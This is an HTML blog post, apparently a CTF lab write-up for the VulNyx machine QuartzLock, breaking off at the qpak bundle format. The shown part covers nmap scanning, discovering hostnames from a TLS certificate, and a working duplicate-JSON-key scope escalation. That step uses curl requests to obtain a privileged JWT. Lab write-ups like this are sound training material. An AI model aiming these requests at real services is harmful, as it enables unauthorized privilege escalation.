@@ -1,0 +1,1264 @@
+<!doctype html>
+<html lang="en-US" class="h-full">
+  <head><script src="/myblog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=myblog/livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="language" content="en-US">
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-P24WBJ6BMJ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-P24WBJ6BMJ');
+</script>
+
+
+
+<script>
+  
+  (function () {
+    const storedTheme = localStorage.getItem("theme");
+    const systemPrefersLight = window.matchMedia("(prefers-color-scheme: light)").matches;
+    const theme = storedTheme || (systemPrefersLight ? "light" : "dark");
+    document.documentElement.setAttribute("data-theme", theme);
+  })();
+</script>
+<title>QuartzLock VulNyx: Writeup | 4mN3s14 | CTF Player &amp; Student</title>
+<meta
+  name="description"
+  content="
+     Authorized lab target only. This walkthrough was reproduced against 192.168.100.143 on June 11, 2026.
+Target Summary Item Value Target 192.168.100.143 Primary …
+  
+  ">
+
+
+  <meta name="keywords" content="misc, vulnyx, labs">
+
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/myblog/posts/quart_lock/">
+
+<meta name="robots" content="index, follow">
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:title" content="QuartzLock VulNyx: Writeup | 4mN3s14 | CTF Player &amp; Student">
+<meta property="og:description" content=" Authorized lab target only. This walkthrough was reproduced against 192.168.100.143 on June 11, 2026.
+Target Summary Item Value Target 192.168.100.143 Primary …">
+<meta property="og:url" content="http://localhost:1313/myblog/posts/quart_lock/">
+<meta property="og:site_name" content="4mN3s14 | CTF Player &amp; Student"><meta property="og:image" content="/myblog/images/logo.png">
+  <meta property="og:image:alt" content="QuartzLock VulNyx: Writeup | 4mN3s14 | CTF Player &amp; Student">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630"><meta property="article:published_time" content="2026-06-02T00:00:00Z">
+  <meta
+    property="article:modified_time"
+    content="2026-06-02T00:00:00Z"><meta property="article:section" content="misc"><meta property="article:tag" content="misc"><meta property="article:tag" content="vulnyx"><meta property="article:tag" content="labs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="QuartzLock VulNyx: Writeup | 4mN3s14 | CTF Player &amp; Student">
+<meta name="twitter:description" content=" Authorized lab target only. This walkthrough was reproduced against 192.168.100.143 on June 11, 2026.
+Target Summary Item Value Target 192.168.100.143 Primary …"><meta name="twitter:image" content="/myblog/images/logo.png">
+  <meta name="twitter:image:alt" content="QuartzLock VulNyx: Writeup | 4mN3s14 | CTF Player &amp; Student"><meta name="twitter:site" content="@J0n4n1">
+  <meta name="twitter:creator" content="@J0n4n1">
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","email":"kagimujkar@gmail.com","name":"4mN3s14 | CTF Player \u0026 Student","sameAs":["https://github.com/John-Jkar","https://twitter.com/J0n4n1"]},"dateModified":"2026-06-02T00:00:00Z","datePublished":"2026-06-02T00:00:00Z","description":" Authorized lab target only. This walkthrough was reproduced against 192.168.100.143 on June 11, 2026.\nTarget Summary Item Value Target 192.168.100.143 Primary …","headline":"QuartzLock VulNyx: Writeup","inLanguage":"en-US","keywords":["misc","vulnyx","labs"],"mainEntityOfPage":{"@id":"http://localhost:1313/myblog/posts/quart_lock/","@type":"WebPage"},"publisher":{"@type":"Organization","name":"4mN3s14 | CTF Player \u0026 Student","url":"http://localhost:1313/myblog/"},"timeRequired":"PT7M","url":"http://localhost:1313/myblog/posts/quart_lock/","wordCount":1404}</script>
+
+
+
+  
+  
+  
+    
+  
+  
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"http://localhost:1313/myblog/","name":"Home","position":1},{"@type":"ListItem","item":"http://localhost:1313/myblog/posts/","name":"Posts","position":2},{"@type":"ListItem","item":"http://localhost:1313/myblog/posts/quart_lock/","name":"QuartzLock VulNyx: Writeup","position":3}]}</script>
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link
+  href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap"
+  rel="stylesheet">
+
+
+<link rel="stylesheet" href="http://localhost:1313/myblog/css/theme.min.29a2f04a9f41258e6c40c77a2b2be43ac8a3a9805c65165860d8b8ec5c442050.css">
+
+
+  <link
+    rel="stylesheet"
+    href="http://localhost:1313/myblog/css/syntax-dark.min.b01037e5609e6260b74d6fcdd6d5131e8dcbc4d46d6ef4bfbe5a60bdfc1a9f30.css"
+    id="syntax-dark-theme"
+    class="syntax-theme">
+  <link
+    rel="stylesheet"
+    href="http://localhost:1313/myblog/css/syntax-light.min.9602bc2fcef52b4c62e05eae14b48ba428e114f116e993e504d83ed5a3aeda98.css"
+    id="syntax-light-theme"
+    class="syntax-theme"
+    disabled><script>
+  
+  (function () {
+    const storedTheme = localStorage.getItem("theme");
+    const systemPrefersLight = window.matchMedia("(prefers-color-scheme: light)").matches;
+    const theme = storedTheme || (systemPrefersLight ? "light" : "dark");
+
+    const syntaxDark = document.getElementById("syntax-dark-theme");
+    const syntaxLight = document.getElementById("syntax-light-theme");
+
+    if (theme === "light") {
+      if (syntaxDark) syntaxDark.disabled = true;
+      if (syntaxLight) syntaxLight.disabled = false;
+    } else {
+      if (syntaxDark) syntaxDark.disabled = false;
+      if (syntaxLight) syntaxLight.disabled = true;
+    }
+
+    
+    const observer = new MutationObserver(() => {
+      const currentTheme = document.documentElement.getAttribute("data-theme");
+      if (currentTheme === "light") {
+        if (syntaxDark) syntaxDark.disabled = true;
+        if (syntaxLight) syntaxLight.disabled = false;
+      } else {
+        if (syntaxDark) syntaxDark.disabled = false;
+        if (syntaxLight) syntaxLight.disabled = true;
+      }
+    });
+
+    observer.observe(document.documentElement, {
+      attributes: true,
+      attributeFilter: ["data-theme"],
+    });
+  })();
+</script>
+
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/myblog/css/bundle.min.57d6410f7c0fffb9ad468070f9ab22cec491cb85b9a66f072e8cce12fe18b8e0.css">
+
+
+
+  <style>
+    .post-content-main img {
+      display: block;
+      width: auto;
+      max-width: min(100%, 900px);
+      max-height: 720px;
+      height: auto;
+      object-fit: contain;
+      margin: 1.75rem auto;
+      border: 1px solid var(--border-color);
+      border-radius: 0.5rem;
+      box-shadow: var(--shadow-md);
+    }
+
+    @media (max-width: 768px) {
+      .post-content-main img {
+        max-width: 100%;
+        max-height: none;
+        margin: 1.25rem auto;
+      }
+    }
+  </style>
+
+
+
+<link rel="icon" type="image/x-icon" href="http://localhost:1313/myblog/favicon.ico">
+<link rel="shortcut icon" type="image/x-icon" href="http://localhost:1313/myblog/favicon.ico">
+
+
+<link rel="icon" type="image/png" href="http://localhost:1313/myblog/favicon.png">
+
+
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/myblog/favicon-32x32.png">
+
+
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/myblog/favicon-16x16.png">
+<link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/myblog/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="192x192" href="http://localhost:1313/myblog/android-chrome-192x192.png">
+<link rel="icon" type="image/png" sizes="512x512" href="http://localhost:1313/myblog/android-chrome-512x512.png">
+<link rel="manifest" href="http://localhost:1313/myblog/site.webmanifest">
+
+
+
+
+  
+    <link
+      rel="alternate"
+      type="application/rss+xml"
+      href="http://localhost:1313/myblog/index.xml"
+      title="4mN3s14 | CTF Player &amp; Student">
+  
+
+
+
+
+  </head>
+  <body class="flex flex-col min-h-screen">
+    <a href="#main-content" class="skip-to-main" aria-label="Skip to main content"
+      >Skip to main content</a
+    >
+    <header class="sticky-header">
+      <div class="header-container">
+        <nav class="header-nav" role="navigation" aria-label="Main navigation">
+  <div class="header-content">
+    <div class="header-logo">
+      <a href="http://localhost:1313/myblog/" class="logo-link" aria-label="Home - 4mN3s14 | CTF Player &amp; Student">
+        4mN3s14 | CTF Player &amp; Student
+      </a>
+    </div>
+
+    
+    <button 
+      id="mobile-menu-toggle" 
+      class="mobile-menu-toggle" 
+      aria-label="Toggle menu" 
+      aria-expanded="false"
+      type="button">
+      <span class="hamburger-icon">
+        <span class="hamburger-line"></span>
+        <span class="hamburger-line"></span>
+        <span class="hamburger-line"></span>
+      </span>
+    </button>
+
+    <div class="header-menu">
+      <ul class="menu-list">
+  
+    <li class="menu-item">
+      <a
+        href="http://localhost:1313/myblog/"
+        class="menu-link ">
+        Home
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="http://localhost:1313/myblog/posts/"
+        class="menu-link ">
+        Posts
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="http://localhost:1313/myblog/about/"
+        class="menu-link ">
+        About
+      </a>
+    </li>
+  
+</ul>
+
+
+      <button id="search-toggle" class="search-toggle" aria-label="Search" type="button">
+        <svg class="search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+        </svg>
+      </button>
+
+      
+
+
+      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme" type="button">
+  <svg class="icon-sun" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+    <path
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      stroke-width="2"
+      d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>
+  </svg>
+  <svg class="icon-moon" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+    <path
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      stroke-width="2"
+      d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>
+  </svg>
+</button>
+
+    </div>
+  </div>
+</nav>
+
+      </div>
+      <div class="reading-progress-bar" aria-hidden="true"></div>
+    </header>
+
+    <main id="main-content" class="flex-1" role="main">
+      
+  <div class="single-post-wrapper">
+    <article class="single-post">
+      
+
+
+
+
+
+
+
+      <header class="post-header">
+        
+
+<nav aria-label="breadcrumb" class="breadcrumb-nav">
+  <ol class="breadcrumb-list" itemscope itemtype="https://schema.org/BreadcrumbList">
+    <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+      <a href="http://localhost:1313/myblog/" itemprop="item"><span itemprop="name">Home</span></a>
+      <meta itemprop="position" content="1" />
+      <span aria-hidden="true" class="breadcrumb-sep">›</span>
+    </li>
+    
+    <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+      <a href="http://localhost:1313/myblog/posts/" itemprop="item"><span itemprop="name">Posts</span></a>
+      <meta itemprop="position" content="2" />
+      <span aria-hidden="true" class="breadcrumb-sep">›</span>
+    </li>
+    
+    <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+      <span itemprop="name" class="breadcrumb-current">QuartzLock VulNyx: Writeup</span>
+      <meta itemprop="position" content="3" />
+    </li>
+  </ol>
+</nav>
+
+
+        <h1 class="post-title-main">QuartzLock VulNyx: Writeup</h1>
+
+        
+
+        <div class="post-meta">
+  <div class="post-meta-info">
+    <time datetime="2026-06-02T00:00:00Z" class="post-date">
+      <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          stroke-width="2"
+          d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+      </svg>
+      June 2, 2026
+    </time>
+
+    <span class="meta-separator">•</span>
+
+    
+      <span class="post-word-count">
+        <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+        </svg>
+        1404 words
+      </span>
+    
+
+    
+      <span class="meta-separator">•</span>
+      <span class="post-reading-time">
+        <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        7 min
+      </span>
+    
+  </div>
+
+  
+    <div class="post-tags">
+      
+        <a href="http://localhost:1313/myblog/tags/misc" class="post-tag">misc</a>
+      
+        <a href="http://localhost:1313/myblog/tags/vulnyx" class="post-tag">vulnyx</a>
+      
+        <a href="http://localhost:1313/myblog/tags/labs" class="post-tag">labs</a>
+      
+    </div>
+  
+</div>
+
+      </header>
+
+      <div class="post-content-main">
+        
+
+
+
+
+
+
+
+<blockquote class="blockquote-regular">
+  <p>Authorized lab target only. This walkthrough was reproduced against
+<code>192.168.100.143</code> on June 11, 2026.</p>
+
+</blockquote>
+<h2 id="target-summary">Target Summary</h2>
+<table>
+	<thead>
+			<tr>
+					<th>Item</th>
+					<th>Value</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Target</td>
+					<td><code>192.168.100.143</code></td>
+			</tr>
+			<tr>
+					<td>Primary hostname</td>
+					<td><code>quartz.nyx</code></td>
+			</tr>
+			<tr>
+					<td>Additional hosts</td>
+					<td><code>api.nyx</code>, <code>enroll.nyx</code></td>
+			</tr>
+			<tr>
+					<td>Initial execution</td>
+					<td><code>svc-attest</code></td>
+			</tr>
+			<tr>
+					<td>User foothold</td>
+					<td><code>caden</code></td>
+			</tr>
+			<tr>
+					<td>Root mechanism</td>
+					<td><code>qctl replay</code> plugin overlay</td>
+			</tr>
+			<tr>
+					<td>User flag</td>
+					<td><code>[REDACTED]</code></td>
+			</tr>
+			<tr>
+					<td>Root flag</td>
+					<td><code>[REDACTED]</code></td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="attack-chain">Attack Chain</h2>
+<ol>
+<li>Discover <code>api.nyx</code> and <code>enroll.nyx</code> in the TLS certificate.</li>
+<li>Abuse duplicate JSON <code>scope</code> keys to obtain a privileged JWT.</li>
+<li>Upload a qpak containing a double-encoded WASI preopen traversal.</li>
+<li>Reach <code>/run/quartz/worker.sock</code> and invoke <code>RunLegacyProbe</code>.</li>
+<li>Execute commands as <code>svc-attest</code>.</li>
+<li>Abuse wildcard asset matching in <code>qcert</code> to obtain an SSH certificate for
+<code>caden</code>.</li>
+<li>SSH as <code>caden</code> and read the user flag.</li>
+<li>Abuse the <code>qctl replay</code> namespace overlay to execute a case plugin as root.</li>
+<li>Read the root flag.</li>
+</ol>
+<h2 id="requirements">Requirements</h2>
+<p>The attacking system needs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nmap
+</span></span><span style="display:flex;"><span>openssl
+</span></span><span style="display:flex;"><span>curl
+</span></span><span style="display:flex;"><span>jq
+</span></span><span style="display:flex;"><span>tar
+</span></span><span style="display:flex;"><span>ssh-keygen
+</span></span><span style="display:flex;"><span>ssh
+</span></span></code></pre></div><p>Set the target variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export TARGET<span style="color:#f92672">=</span>192.168.100.143
+</span></span></code></pre></div><p>Either add the virtual hosts:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span>$TARGET<span style="color:#e6db74"> quartz.nyx api.nyx enroll.nyx&#34;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><p>or use <code>curl --resolve</code>, as shown throughout this report.</p>
+<h2 id="1-service-enumeration">1. Service Enumeration</h2>
+<p>Run the default script and version scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sC -sV -vv -oA lock <span style="color:#e6db74">&#34;</span>$TARGET<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>Relevant results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>22/tcp   open   ssh        OpenSSH 9.9
+</span></span><span style="display:flex;"><span>80/tcp   open   http       nginx 1.26.3
+</span></span><span style="display:flex;"><span>443/tcp  open   ssl/http   nginx 1.26.3
+</span></span></code></pre></div><p>Port 80 redirects to <code>https://quartz.nyx/</code>. The TLS certificate on port 443
+contains the additional application hostnames.</p>
+<p><img src="http://localhost:1313/myblog/images/quartzlock/01-terminal.png" alt="Nmap service scan"></p>
+<h2 id="2-virtual-host-discovery">2. Virtual Host Discovery</h2>
+<p>Inspect the certificate:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl s_client <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -connect <span style="color:#e6db74">&#34;</span>$TARGET<span style="color:#e6db74">:443&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -servername quartz.nyx &lt;/dev/null 2&gt;/dev/null |
+</span></span><span style="display:flex;"><span>  openssl x509 -noout -subject -issuer -ext subjectAltName
+</span></span></code></pre></div><p>The SAN extension discloses:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>DNS:quartz.nyx
+</span></span><span style="display:flex;"><span>DNS:api.nyx
+</span></span><span style="display:flex;"><span>DNS:enroll.nyx
+</span></span></code></pre></div><p><img src="http://localhost:1313/myblog/images/quartzlock/02-terminal.png" alt="TLS SAN discovery"></p>
+<p>The primary portal confirms the device-trust theme and references API
+documentation and attestation metadata.</p>
+<p><img src="http://localhost:1313/myblog/images/quartzlock/00-portal.png" alt="QuartzLock portal"></p>
+<h2 id="3-documentation-and-metadata">3. Documentation and Metadata</h2>
+<p>Retrieve the well-known metadata:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -sk <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --resolve <span style="color:#e6db74">&#34;quartz.nyx:443:</span>$TARGET<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  https://quartz.nyx/.well-known/quartz-attestation | jq
+</span></span></code></pre></div><p>Important fields:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;accepted_scopes&#34;</span>: [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;device:enroll&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;bundle:submit&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;probe:upload&#34;</span>
+</span></span><span style="display:flex;"><span>  ],
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;canonicalization&#34;</span>: <span style="color:#e6db74">&#34;jcs-v1&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;compatibility_mode&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;legacy_parser&#34;</span>: <span style="color:#e6db74">&#34;stream&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;token_format&#34;</span>: <span style="color:#e6db74">&#34;JWT&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The combination of JCS canonicalization and a legacy streaming parser is a
+strong indication that separate components may interpret duplicate JSON keys
+differently.</p>
+<p>Open the documentation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -sk <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --resolve <span style="color:#e6db74">&#34;quartz.nyx:443:</span>$TARGET<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  https://quartz.nyx/docs
+</span></span></code></pre></div><p>The relevant endpoints are:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>POST /api/v2/enrollment/quote
+</span></span><span style="display:flex;"><span>POST /api/v2/enrollment/exchange
+</span></span><span style="display:flex;"><span>POST /api/v2/bundles
+</span></span><span style="display:flex;"><span>GET  /api/v2/jobs/{id}
+</span></span></code></pre></div><p>The bundle endpoint requires <code>bundle:submit</code> or <code>probe:upload</code> and accepts
+gzip-compressed <code>.qpak</code> files for the WASI compatibility profile.</p>
+<p><img src="http://localhost:1313/myblog/images/quartzlock/03-api-docs.png" alt="API documentation"></p>
+<p><img src="http://localhost:1313/myblog/images/quartzlock/03-terminal.png" alt="Metadata and documentation output"></p>
+<h2 id="4-normal-enrollment">4. Normal Enrollment</h2>
+<p>A normal enrollment request receives only <code>device:enroll</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>NORMAL<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;sub&#34;: &#34;edge-node-117&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;tenant&#34;: &#34;public&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;scope&#34;: [&#34;device:enroll&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl -sk <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --resolve <span style="color:#e6db74">&#34;api.nyx:443:</span>$TARGET<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --data-binary <span style="color:#e6db74">&#34;</span>$NORMAL<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  https://api.nyx/api/v2/enrollment/exchange | jq
+</span></span></code></pre></div><p>Expected scope:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;issued_scope&#34;</span>: [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;device:enroll&#34;</span>
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>That token cannot submit qpak bundles.</p>
+<h2 id="5-duplicate-key-scope-escalation">5. Duplicate-Key Scope Escalation</h2>
+<p>The policy validator consumes the final duplicate <code>scope</code> value, while the
+legacy authorization parser uses the first value.</p>
+<p>Send a privileged scope first and a harmless scope last:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>EVIL<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;sub&#34;: &#34;edge-node-117&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;tenant&#34;: &#34;public&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;scope&#34;: [&#34;bundle:submit&#34;, &#34;probe:upload&#34;],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;scope&#34;: [&#34;device:enroll&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RESPONSE<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>
+</span></span><span style="display:flex;"><span>  curl -sk <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    --resolve <span style="color:#e6db74">&#34;api.nyx:443:</span>$TARGET<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    --data-binary <span style="color:#e6db74">&#34;</span>$EVIL<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    https://api.nyx/api/v2/enrollment/exchange
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span>$RESPONSE<span style="color:#e6db74">&#34;</span> | jq
+</span></span><span style="display:flex;"><span>export TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">&#34;</span>$RESPONSE<span style="color:#e6db74">&#34;</span> | jq -r .token<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><p>The server issues:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;issued_scope&#34;</span>: [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;bundle:submit&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;probe:upload&#34;</span>
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The JWT claims also contain both privileged scopes.</p>
+<p><img src="http://localhost:1313/myblog/images/quartzlock/04-terminal.png" alt="Duplicate-key scope escalation"></p>
+<h3 id="why-it-works">Why It Works</h3>
+<p>The request has two valid interpretations:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Canonical policy parser: last key wins  -&gt; device:enroll
+</span></span><span style="display:flex;"><span>Legacy stream parser:     first key wins -&gt; bundle:submit, probe:upload
+</span></span></code></pre></div><p>Validation and authorization do not operate on the same parsed object.</p>
+<h2 id="6-qpak-format">6. qpak Format</h2>
+<p>The bundle must be a gzip-compressed tar archive containing exactly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>manifest.toml
+</span></span><span style="display:flex;"><span>probe.wasm
+</span></span><span style="display:flex;"><span>policy.rego
+</span></span><span style="display:flex;"><span>sbom.json
+</span></span></code></pre></div><p>Create a working directory:</p>
